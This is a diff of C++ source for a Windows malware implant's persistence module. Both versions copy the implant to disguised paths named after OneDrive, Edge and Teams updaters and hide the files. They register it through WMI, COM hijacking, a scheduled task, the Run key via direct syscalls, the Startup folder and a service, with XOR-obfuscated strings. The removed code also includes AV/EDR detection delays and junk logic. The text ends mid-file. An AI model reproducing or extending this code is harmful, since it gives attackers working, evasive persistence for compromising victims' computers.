@@ -1,292 +1,160 @@
 #include "Persistence.h"
-#include "ComHijacker.h"
 #include "WmiPersistence.h"
-#include "../utils/Logger.h"
-#include "../utils/Shared.h"
-#include "../utils/Obfuscator.h"
-#include "../utils/ApiHasher.h"
+#include "ComHijacker.h"
 #include "../evasion/Syscalls.h"
 #include "../evasion/NtStructs.h"
-#include "../evasion/Detection.h"
+#include "../utils/Obfuscator.h"
+#include "../utils/Logger.h"
+#include "../utils/Shared.h"
 #include <windows.h>
+#include <shlobj.h>
+#include <iostream>
 #include <string>
 #include <vector>
-#include <shlobj.h>
-#include <random>
-#include <sstream>
-#include <algorithm>
-#include <cwctype>
 
 namespace persistence {
 
 namespace {
+    const wchar_t kRunKeyEnc[] = { 'S'^0x5A, 'o'^0x5A, 'f'^0x5A, 't'^0x5A, 'w'^0x5A, 'a'^0x5A, 'r'^0x5A, 'e'^0x5A, '\\'^0x5A, 'M'^0x5A, 'i'^0x5A, 'c'^0x5A, 'r'^0x5A, 'o'^0x5A, 's'^0x5A, 'o'^0x5A, 'f'^0x5A, 't'^0x5A, '\\'^0x5A, 'W'^0x5A, 'i'^0x5A, 'n'^0x5A, 'd'^0x5A, 'o'^0x5A, 'w'^0x5A, 's'^0x5A, '\\'^0x5A, 'C'^0x5A, 'u'^0x5A, 'r'^0x5A, 'r'^0x5A, 'e'^0x5A, 'n'^0x5A, 't'^0x5A, 'V'^0x5A, 'e'^0x5A, 'r'^0x5A, 's'^0x5A, 'i'^0x5A, 'o'^0x5A, 'n'^0x5A, '\\'^0x5A, 'R'^0x5A, 'u'^0x5A, 'n'^0x5A }; // Software\Microsoft\Windows\CurrentVersion\Run
+    const wchar_t kTaskNameEnc[] = { 'O'^0x5A, 'n'^0x5A, 'e'^0x5A, 'D'^0x5A, 'r'^0x5A, 'i'^0x5A, 'v'^0x5A, 'e'^0x5A, 'S'^0x5A, 'y'^0x5A, 'n'^0x5A, 'c'^0x5A }; // OneDriveSync
+    const wchar_t kClsidEnc[] = { '{'^0x5A, '0'^0x5A, '0'^0x5A, '0'^0x5A, '2'^0x5A, '1'^0x5A, '4'^0x5A, '0'^0x5A, '1'^0x5A, '-'^0x5A, '0'^0x5A, '0'^0x5A, '0'^0x5A, '0'^0x5A, '-'^0x5A, '0'^0x5A, '0'^0x5A, '0'^0x5A, '0'^0x5A, '-'^0x5A, 'C'^0x5A, '0'^0x5A, '0'^0x5A, '0'^0x5A, '-'^0x5A, '0'^0x5A, '0'^0x5A, '0'^0x5A, '0'^0x5A, '0'^0x5A, '0'^0x5A, '0'^0x5A, '0'^0x5A, '0'^0x5A, '4'^0x5A, '6'^0x5A, '}'^0x5A }; // {00021401-0000-0000-C000-000000000046}
 
-// XOR encrypted (0x5A)
-// "Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\Shell Folders"
-const wchar_t kShellFoldersEnc[] = { 'S'^0x5A, 'o'^0x5A, 'f'^0x5A, 't'^0x5A, 'w'^0x5A, 'a'^0x5A, 'r'^0x5A, 'e'^0x5A, '\\'^0x5A, 'M'^0x5A, 'i'^0x5A, 'c'^0x5A, 'r'^0x5A, 'o'^0x5A, 's'^0x5A, 'o'^0x5A, 'f'^0x5A, 't'^0x5A, '\\'^0x5A, 'W'^0x5A, 'i'^0x5A, 'n'^0x5A, 'd'^0x5A, 'o'^0x5A, 'w'^0x5A, 's'^0x5A, '\\'^0x5A, 'C'^0x5A, 'u'^0x5A, 'r'^0x5A, 'r'^0x5A, 'e'^0x5A, 'n'^0x5A, 't'^0x5A, 'V'^0x5A, 'e'^0x5A, 'r'^0x5A, 's'^0x5A, 'i'^0x5A, 'o'^0x5A, 'n'^0x5A, '\\'^0x5A, 'E'^0x5A, 'x'^0x5A, 'p'^0x5A, 'l'^0x5A, 'o'^0x5A, 'r'^0x5A, 'e'^0x5A, 'r'^0x5A, '\\'^0x5A, 'S'^0x5A, 'h'^0x5A, 'e'^0x5A, 'l'^0x5A, 'l'^0x5A, ' '^0x5A, 'F'^0x5A, 'o'^0x5A, 'l'^0x5A, 'd'^0x5A, 'e'^0x5A, 'r'^0x5A, 's'^0x5A };
-// "Startup"
-const wchar_t kStartupValEnc[] = { 'S'^0x5A, 't'^0x5A, 'a'^0x5A, 'r'^0x5A, 't'^0x5A, 'u'^0x5A, 'p'^0x5A };
-
-// "Volatile Environment"
-const wchar_t kVolatileEnvEnc[] = { 'V'^0x5A, 'o'^0x5A, 'l'^0x5A, 'a'^0x5A, 't'^0x5A, 'i'^0x5A, 'l'^0x5A, 'e'^0x5A, ' '^0x5A, 'E'^0x5A, 'n'^0x5A, 'v'^0x5A, 'i'^0x5A, 'r'^0x5A, 'o'^0x5A, 'n'^0x5A, 'm'^0x5A, 'e'^0x5A, 'n'^0x5A, 't'^0x5A };
-// "DropperPath"
-const wchar_t kDropperPathValEnc[] = { 'D'^0x5A, 'r'^0x5A, 'o'^0x5A, 'p'^0x5A, 'p'^0x5A, 'e'^0x5A, 'r'^0x5A, 'P'^0x5A, 'a'^0x5A, 't'^0x5A, 'h'^0x5A };
-
-void JunkLogic() {
-    volatile int x = 0;
-    for (int i = 0; i < 1000; i++) {
-        x += (i % 3) ? 1 : -1;
-    }
-}
-
-struct PersistTarget {
-    std::wstring path;
-    std::wstring name;
-};
-
-// "Software\\Microsoft\\Windows\\CurrentVersion\\Run"
-const wchar_t kRunKeyEnc[] = { 'S'^0x5A, 'o'^0x5A, 'f'^0x5A, 't'^0x5A, 'w'^0x5A, 'a'^0x5A, 'r'^0x5A, 'e'^0x5A, '\\'^0x5A, 'M'^0x5A, 'i'^0x5A, 'c'^0x5A, 'r'^0x5A, 'o'^0x5A, 's'^0x5A, 'o'^0x5A, 'f'^0x5A, 't'^0x5A, '\\'^0x5A, 'W'^0x5A, 'i'^0x5A, 'n'^0x5A, 'd'^0x5A, 'o'^0x5A, 'w'^0x5A, 's'^0x5A, '\\'^0x5A, 'C'^0x5A, 'u'^0x5A, 'r'^0x5A, 'r'^0x5A, 'e'^0x5A, 'n'^0x5A, 't'^0x5A, 'V'^0x5A, 'e'^0x5A, 'r'^0x5A, 's'^0x5A, 'i'^0x5A, 'o'^0x5A, 'n'^0x5A, '\\'^0x5A, 'R'^0x5A, 'u'^0x5A, 'n'^0x5A };
-
-std::wstring getExecutablePath() {
-    wchar_t path[MAX_PATH];
-    GetModuleFileNameW(NULL, path, MAX_PATH);
-    return std::wstring(path);
-}
-
-PersistTarget getRandomTarget() {
-    std::random_device rd;
-    std::mt19937 gen(rd());
-    bool isAdmin = utils::IsAdmin();
-    std::vector<PersistTarget> targets;
-
-    if (isAdmin) {
-        wchar_t progData[MAX_PATH];
-        SHGetFolderPathW(NULL, CSIDL_COMMON_APPDATA, NULL, 0, progData);
-        targets.push_back({std::wstring(progData) + L"\\Microsoft\\Windows\\Update\\winupdate.exe", L"WinUpdate"});
-    } else {
-        wchar_t localAppData[MAX_PATH];
-        SHGetFolderPathW(NULL, CSIDL_LOCAL_APPDATA, NULL, 0, localAppData);
-        targets.push_back({std::wstring(localAppData) + L"\\Microsoft\\OneDrive\\OneDriveStandaloneUpdater.exe", L"OneDriveUpdater"});
-        targets.push_back({std::wstring(localAppData) + L"\\Microsoft\\Teams\\TeamsUpdate.exe", L"TeamsUpdate"});
-    }
-    std::uniform_int_distribution<> dis(0, (int)targets.size() - 1);
-    return targets[dis(gen)];
-}
-
-bool SetFileAttributesStealth(const std::wstring& path) {
-    return SetFileAttributesW(path.c_str(), FILE_ATTRIBUTE_HIDDEN | FILE_ATTRIBUTE_SYSTEM);
-}
-
-bool SyscallWriteFile(const std::wstring& ntPath, const std::vector<BYTE>& data) {
-    auto& resolver = evasion::SyscallResolver::GetInstance();
-    DWORD ntCreateFileSsn = resolver.GetServiceNumber("NtCreateFile");
-    DWORD ntWriteFileSsn = resolver.GetServiceNumber("NtWriteFile");
-    DWORD ntCloseSsn = resolver.GetServiceNumber("NtClose");
-    if (ntCreateFileSsn == 0xFFFFFFFF || ntWriteFileSsn == 0xFFFFFFFF || ntCloseSsn == 0xFFFFFFFF) return false;
-    UNICODE_STRING uPath;
-    uPath.Buffer = (PWSTR)ntPath.c_str();
-    uPath.Length = (USHORT)(ntPath.length() * sizeof(wchar_t));
-    uPath.MaximumLength = uPath.Length + sizeof(wchar_t);
-    OBJECT_ATTRIBUTES objAttr;
-    InitializeObjectAttributes(&objAttr, &uPath, OBJ_CASE_INSENSITIVE, NULL, NULL);
-    HANDLE hFile = NULL;
-    IO_STATUS_BLOCK ioStatus;
-    NTSTATUS status = InternalDoSyscall(ntCreateFileSsn, &hFile, (PVOID)(UINT_PTR)(FILE_GENERIC_WRITE | SYNCHRONIZE), &objAttr, &ioStatus, NULL, (PVOID)(UINT_PTR)FILE_ATTRIBUTE_NORMAL, 0, (PVOID)(UINT_PTR)FILE_OVERWRITE_IF, (PVOID)(UINT_PTR)(FILE_SYNCHRONOUS_IO_NONALERT | FILE_NON_DIRECTORY_FILE), NULL, (PVOID)(UINT_PTR)0);
-    if (!NT_SUCCESS(status)) return false;
-    status = InternalDoSyscall(ntWriteFileSsn, hFile, NULL, NULL, NULL, &ioStatus, (PVOID)data.data(), (PVOID)(UINT_PTR)(ULONG)data.size(), NULL, NULL, NULL, NULL);
-    InternalDoSyscall(ntCloseSsn, hFile, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL);
-    return NT_SUCCESS(status);
-}
-
-std::vector<BYTE> ReadFileBinary(const std::wstring& path) {
-    HANDLE hFile = CreateFileW(path.c_str(), GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
-    if (hFile == INVALID_HANDLE_VALUE) return {};
-    DWORD size = GetFileSize(hFile, NULL);
-    if (size == INVALID_FILE_SIZE) { CloseHandle(hFile); return {}; }
-    std::vector<BYTE> buffer(size);
-    DWORD read = 0;
-    ReadFile(hFile, buffer.data(), size, &read, NULL);
-    CloseHandle(hFile);
-    return buffer;
-}
-
-bool InstallRegistryRun(const std::wstring& implantPath, const std::wstring& name) {
-    std::wstring sid = utils::GetCurrentUserSid();
-    if (sid.empty()) return false;
-    auto& resolver = evasion::SyscallResolver::GetInstance();
-    DWORD ntOpenKeySsn = resolver.GetServiceNumber("NtOpenKey");
-    DWORD ntSetValueKeySsn = resolver.GetServiceNumber("NtSetValueKey");
-    DWORD ntCloseSsn = resolver.GetServiceNumber("NtClose");
-
-    std::wstring relativePath = utils::DecryptW(kRunKeyEnc, 45);
-    std::wstring hkcuPath = L"\\Registry\\User\\" + sid + L"\\" + relativePath;
-    UNICODE_STRING uHkcu;
-    uHkcu.Buffer = (PWSTR)hkcuPath.c_str();
-    uHkcu.Length = (USHORT)(hkcuPath.length() * sizeof(wchar_t));
-    uHkcu.MaximumLength = uHkcu.Length + sizeof(wchar_t);
-    OBJECT_ATTRIBUTES objAttr;
-    InitializeObjectAttributes(&objAttr, &uHkcu, OBJ_CASE_INSENSITIVE, NULL, NULL);
-    HANDLE hKey = NULL;
-    NTSTATUS status = InternalDoSyscall(ntOpenKeySsn, &hKey, (PVOID)(UINT_PTR)KEY_ALL_ACCESS, &objAttr, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL);
-    if (NT_SUCCESS(status)) {
-        UNICODE_STRING uName;
-        uName.Buffer = (PWSTR)name.c_str();
-        uName.Length = (USHORT)(name.length() * sizeof(wchar_t));
-        uName.MaximumLength = uName.Length + sizeof(wchar_t);
-        InternalDoSyscall(ntSetValueKeySsn, hKey, &uName, NULL, (PVOID)(UINT_PTR)REG_SZ, (PVOID)implantPath.c_str(), (PVOID)(UINT_PTR)((implantPath.length() + 1) * sizeof(wchar_t)), NULL, NULL, NULL, NULL, NULL);
-        InternalDoSyscall(ntCloseSsn, hKey, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL);
-    }
-    return true;
-}
-
-bool InstallSchtasks(const std::wstring& implantPath, const std::wstring& name) {
-    std::wstring cmd = L"/create /f /tn \"" + name + L"\" /tr \"" + implantPath + L"\" /sc logon /rl highest";
-    HINSTANCE res = ShellExecuteW(NULL, L"open", L"schtasks.exe", cmd.c_str(), NULL, SW_HIDE);
-    return (INT_PTR)res > 32;
-}
-
-bool InstallService(const std::wstring& implantPath, const std::wstring& name) {
-    if (!utils::IsAdmin()) return false;
-    SC_HANDLE hSCM = OpenSCManager(NULL, NULL, SC_MANAGER_ALL_ACCESS);
-    if (!hSCM) return false;
-    SC_HANDLE hService = CreateServiceW(hSCM, name.c_str(), name.c_str(), SERVICE_ALL_ACCESS, SERVICE_WIN32_OWN_PROCESS, SERVICE_AUTO_START, SERVICE_ERROR_NORMAL, implantPath.c_str(), NULL, NULL, NULL, NULL, NULL);
-    if (!hService) {
-        hService = OpenServiceW(hSCM, name.c_str(), SERVICE_ALL_ACCESS);
-    }
-    if (hService) {
-        CloseServiceHandle(hService);
-        CloseServiceHandle(hSCM);
-        return true;
-    }
-    CloseServiceHandle(hSCM);
-    return false;
-}
-
-bool InstallStartup(const std::wstring& implantPath, const std::wstring& name) {
-    HKEY hKey;
-    std::wstring startupPath;
-    if (RegOpenKeyExW(HKEY_CURRENT_USER, utils::DecryptW(kShellFoldersEnc, 64).c_str(), 0, KEY_READ, &hKey) == ERROR_SUCCESS) {
+    std::wstring GetPersistencePath(bool admin) {
         wchar_t path[MAX_PATH];
-        DWORD sz = sizeof(path);
-        if (RegQueryValueExW(hKey, utils::DecryptW(kStartupValEnc, 7).c_str(), NULL, NULL, (LPBYTE)path, &sz) == ERROR_SUCCESS) {
-            startupPath = path;
-        }
-        RegCloseKey(hKey);
-    }
-    if (startupPath.empty()) return false;
-    std::wstring target = startupPath + L"\\" + name + L".exe";
-    return CopyFileW(implantPath.c_str(), target.c_str(), FALSE) != 0;
-}
-
-void CreateDirectoryRecursive(const std::wstring& path) {
-    size_t lastSlash = path.find_last_of(L"\\");
-    if (lastSlash != std::wstring::npos) {
-        std::wstring dirOnly = path.substr(0, lastSlash);
-        std::wstring current;
-        std::wstringstream ss(dirOnly);
-        std::wstring segment;
-        while (std::getline(ss, segment, L'\\')) {
-            if (current.empty()) current = segment;
-            else current += L"\\" + segment;
-            CreateDirectoryW(current.c_str(), NULL);
-        }
-    }
-}
-
-} // namespace
-
-std::wstring establishPersistence(const std::wstring& overrideSourcePath) {
-    JunkLogic();
-
-    if (evasion::Detection::IsAVPresent()) {
-        LOG_WARN("AV/EDR detected. Delaying persistence...");
-        Sleep(60000 + (GetTickCount() % 120000));
-    }
-
-    std::wstring sourcePath = overrideSourcePath;
-    if (sourcePath.empty()) {
-        sourcePath = getExecutablePath();
-        // If we are in explorer.exe, try to recover the dropper path from registry
-        std::wstring current = sourcePath;
-        for (auto& c : current) c = (wchar_t)::towlower(c);
-        if (current.find(L"explorer.exe") != std::wstring::npos || current.find(L"runtimebroker.exe") != std::wstring::npos) {
-            HKEY hKey;
-            std::wstring volEnv = utils::DecryptW(kVolatileEnvEnc, 20);
-            std::wstring dropKey = utils::DecryptW(kDropperPathValEnc, 11);
-            if (RegOpenKeyExW(HKEY_CURRENT_USER, volEnv.c_str(), 0, KEY_READ, &hKey) == ERROR_SUCCESS) {
-                wchar_t buf[MAX_PATH];
-                DWORD sz = sizeof(buf);
-                if (RegQueryValueExW(hKey, dropKey.c_str(), NULL, NULL, (LPBYTE)buf, &sz) == ERROR_SUCCESS) {
-                    sourcePath = buf;
-                }
-                RegCloseKey(hKey);
+        if (admin) {
+            if (SUCCEEDED(SHGetFolderPathW(NULL, CSIDL_COMMON_APPDATA, NULL, 0, path))) {
+                return std::wstring(path) + L"\\Microsoft\\OneDriveSync.exe";
+            }
+        } else {
+            if (SUCCEEDED(SHGetFolderPathW(NULL, CSIDL_LOCAL_APPDATA, NULL, 0, path))) {
+                return std::wstring(path) + L"\\Microsoft\\EdgeUpdate.exe";
             }
         }
+        return L"";
     }
 
-    PersistTarget target = getRandomTarget();
-
-    // Check if we are already in one of the possible persist targets
-    wchar_t currentPathBuf[MAX_PATH];
-    GetModuleFileNameW(NULL, currentPathBuf, MAX_PATH);
-    std::wstring currentPath(currentPathBuf);
-    for (auto& c : currentPath) c = (wchar_t)::towlower(c);
-
-    if (currentPath.find(L"\\appdata\\local\\microsoft\\") != std::wstring::npos ||
-        currentPath.find(L"\\programdata\\microsoft\\") != std::wstring::npos) {
-        if (currentPath.find(L"\\temp\\") == std::wstring::npos) {
-            LOG_INFO("Already running from persistence.");
-            // Even if running from persistence, we continue to re-assert all methods
+    bool InstallRegistryRun(const std::wstring& implantPath) {
+        std::wstring sid = utils::GetCurrentUserSid();
+        if (sid.empty()) return false;
+        auto& resolver = evasion::SyscallResolver::GetInstance();
+        DWORD ntOpenKeySsn = resolver.GetServiceNumber("NtOpenKey");
+        DWORD ntSetValueKeySsn = resolver.GetServiceNumber("NtSetValueKey");
+        DWORD ntCloseSsn = resolver.GetServiceNumber("NtClose");
+        std::wstring hkcuPath = L"\\Registry\\User\\" + sid;
+        UNICODE_STRING uHkcu;
+        uHkcu.Buffer = (PWSTR)hkcuPath.c_str();
+        uHkcu.Length = (USHORT)(hkcuPath.length() * sizeof(wchar_t));
+        uHkcu.MaximumLength = uHkcu.Length + sizeof(wchar_t);
+        OBJECT_ATTRIBUTES objAttr;
+        InitializeObjectAttributes(&objAttr, &uHkcu, OBJ_CASE_INSENSITIVE, NULL, NULL);
+        HANDLE hHkcu = NULL;
+        NTSTATUS status = InternalDoSyscall(ntOpenKeySsn, (UINT_PTR)&hHkcu, (UINT_PTR)KEY_WRITE, (UINT_PTR)&objAttr, 0, 0, 0, 0, 0, 0, 0, 0);
+        if (!NT_SUCCESS(status)) return false;
+        HANDLE hRunKey = NULL;
+        status = (NTSTATUS)utils::Shared::NtCreateKeyRelative(hHkcu, utils::DecryptW(kRunKeyEnc, 45), &hRunKey);
+        InternalDoSyscall(ntCloseSsn, (UINT_PTR)hHkcu, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0);
+        if (NT_SUCCESS(status)) {
+            std::wstring valName = utils::DecryptW(kTaskNameEnc, 12);
+            UNICODE_STRING uValName;
+            uValName.Buffer = (PWSTR)valName.c_str();
+            uValName.Length = (USHORT)(valName.length() * sizeof(wchar_t));
+            uValName.MaximumLength = uValName.Length + sizeof(wchar_t);
+            InternalDoSyscall(ntSetValueKeySsn, (UINT_PTR)hRunKey, (UINT_PTR)&uValName, 0, (UINT_PTR)REG_SZ, (UINT_PTR)implantPath.c_str(), (UINT_PTR)((implantPath.length() + 1) * sizeof(wchar_t)), 0, 0, 0, 0, 0);
+            InternalDoSyscall(ntCloseSsn, (UINT_PTR)hRunKey, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0);
+            return true;
         }
+        return false;
     }
 
-    CreateDirectoryRecursive(target.path);
-    std::vector<BYTE> selfData = ReadFileBinary(sourcePath);
-    bool copied = false;
-    if (!selfData.empty()) {
-        std::wstring ntPersistPath = L"\\??\\" + target.path;
-        copied = SyscallWriteFile(ntPersistPath, selfData);
+    bool InstallStartupFolder(const std::wstring& implantPath) {
+        wchar_t path[MAX_PATH];
+        if (SUCCEEDED(SHGetFolderPathW(NULL, CSIDL_STARTUP, NULL, 0, path))) {
+            std::wstring dest = std::wstring(path) + L"\\OneDriveSync.exe";
+            if (CopyFileW(implantPath.c_str(), dest.c_str(), FALSE)) {
+                SetFileAttributesW(dest.c_str(), FILE_ATTRIBUTE_HIDDEN | FILE_ATTRIBUTE_SYSTEM);
+                return true;
+            }
+        }
+        return false;
     }
-    if (!copied) copied = CopyFileW(sourcePath.c_str(), target.path.c_str(), FALSE) != 0;
 
-    if (copied) {
-        SetFileAttributesStealth(target.path);
-        LOG_INFO("Binary at " + utils::ws2s(target.path));
+    bool InstallService(const std::wstring& implantPath) {
+        if (!utils::IsAdmin()) return false;
+        SC_HANDLE hSCM = OpenSCManagerW(NULL, NULL, SC_MANAGER_CREATE_SERVICE);
+        if (!hSCM) return false;
+        std::wstring svcName = utils::DecryptW(kTaskNameEnc, 12);
+        SC_HANDLE hService = CreateServiceW(hSCM, svcName.c_str(), svcName.c_str(), SERVICE_ALL_ACCESS, SERVICE_WIN32_OWN_PROCESS, SERVICE_AUTO_START, SERVICE_ERROR_NORMAL, implantPath.c_str(), NULL, NULL, NULL, NULL, NULL);
+        if (hService) {
+            CloseServiceHandle(hService);
+            CloseServiceHandle(hSCM);
+            return true;
+        }
+        CloseServiceHandle(hSCM);
+        return false;
+    }
+
+    bool InstallScheduledTask(const std::wstring& implantPath) {
+        std::wstring taskName = utils::DecryptW(kTaskNameEnc, 12);
+        std::wstring cmd = L"schtasks /create /tn \"" + taskName + L"\" /tr \"" + implantPath + L"\" /sc onlogon /f /rl highest";
+        return WinExec(utils::ws2s(cmd).c_str(), SW_HIDE) > 31;
+    }
+}
+
+std::wstring establishPersistence(const std::wstring& overrideSourcePath) {
+    LOG_INFO("Establishing persistence...");
+    bool isAdmin = utils::IsAdmin();
+    std::wstring targetPath = GetPersistencePath(isAdmin);
+    if (targetPath.empty()) return L"";
+
+    wchar_t currentPath[MAX_PATH];
+    if (overrideSourcePath.empty()) {
+        GetModuleFileNameW(NULL, currentPath, MAX_PATH);
     } else {
-        LOG_ERR("Copy failed.");
-        std::wstring sPathLower = sourcePath;
-        for (auto& c : sPathLower) c = (wchar_t)::towlower(c);
-        if (currentPath == sPathLower) {
-             LOG_INFO("Source is current, proceed with registration.");
-             target.path = currentPathBuf;
+        wcscpy(currentPath, overrideSourcePath.c_str());
+    }
+
+    if (wcscmp(currentPath, targetPath.c_str()) != 0) {
+        std::wstring dir = targetPath.substr(0, targetPath.find_last_of(L"\\"));
+        CreateDirectoryW(dir.c_str(), NULL);
+        if (!CopyFileW(currentPath, targetPath.c_str(), FALSE)) {
+            LOG_ERR("Failed to copy binary to persistence path: " + utils::ws2s(targetPath));
         } else {
-             return L"";
+            SetFileAttributesW(targetPath.c_str(), FILE_ATTRIBUTE_HIDDEN | FILE_ATTRIBUTE_SYSTEM);
         }
     }
 
-    // Install ALL methods for redundancy
-    Sleep(15000);
-    if (WmiPersistence::Install(target.path, target.name)) LOG_INFO("WMI ok.");
+    std::wstring taskName = utils::DecryptW(kTaskNameEnc, 12);
 
-    Sleep(15000);
-    std::wstring clsid = L"{00021400-0000-0000-C000-000000000046}";
-    if (ComHijacker::Install(target.path, clsid)) LOG_INFO("COM ok.");
+    // Redundancy is mandatory: Install ALL methods
 
-    Sleep(15000);
-    if (InstallSchtasks(target.path, target.name)) LOG_INFO("Task ok.");
-
-    Sleep(15000);
-    if (InstallRegistryRun(target.path, target.name)) LOG_INFO("Reg ok.");
-
-    Sleep(15000);
-    if (InstallStartup(target.path, target.name)) LOG_INFO("Startup ok.");
-
-    if (utils::IsAdmin()) {
-        Sleep(15000);
-        if (InstallService(target.path, target.name)) LOG_INFO("Svc ok.");
+    if (WmiPersistence::Install(targetPath, taskName)) {
+        LOG_INFO("WMI Persistence success");
+        WmiPersistence::Verify(taskName);
     }
 
-    return target.path;
+    std::wstring clsid = utils::DecryptW(kClsidEnc, 38);
+    if (ComHijacker::Install(targetPath, clsid)) {
+        LOG_INFO("COM Hijack success");
+        ComHijacker::Verify(clsid);
+    }
+
+    if (InstallScheduledTask(targetPath)) {
+        LOG_INFO("Scheduled Task success");
+    }
+
+    if (InstallRegistryRun(targetPath)) {
+        LOG_INFO("Registry Run success");
+    }
+
+    if (InstallStartupFolder(targetPath)) {
+        LOG_INFO("Startup Folder success");
+    }
+
+    if (InstallService(targetPath)) {
+        LOG_INFO("Service success");
+    }
+
+    return targetPath;
 }
 
 void ReinstallPersistence() {
